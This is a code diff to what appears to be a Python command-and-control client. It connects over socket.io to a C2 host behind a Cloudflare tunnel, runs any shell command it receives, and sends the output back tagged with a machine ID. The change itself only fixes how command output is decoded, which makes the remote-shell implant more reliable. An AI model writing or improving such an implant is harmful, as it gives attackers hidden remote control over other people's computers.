@@ -1,6 +1,7 @@
 import subprocess
 import socketio
 import time
+import locale
 from config import C2_HOST, C2_PORT, MACHINE_ID
 C2_URL = C2_HOST  # port handled by Cloudflare tunnel, no need to append
 
@@ -28,15 +29,17 @@ def make_client():
             sio.emit("shell_output", {"machine": MACHINE_ID, "output": "[error] empty command received"})
             return
 
+        encoding = locale.getpreferredencoding(False) or "utf-8"
+
         try:
             result = subprocess.run(
                 command,
                 shell=True,
                 capture_output=True,
-                text=True,
                 timeout=10
             )
-            output = (result.stdout or "") + (result.stderr or "")
+            output = (result.stdout or b"").decode(encoding, errors="replace") + \
+                     (result.stderr or b"").decode(encoding, errors="replace")
         except subprocess.TimeoutExpired:
             output = "[timeout]"
         except Exception as e:
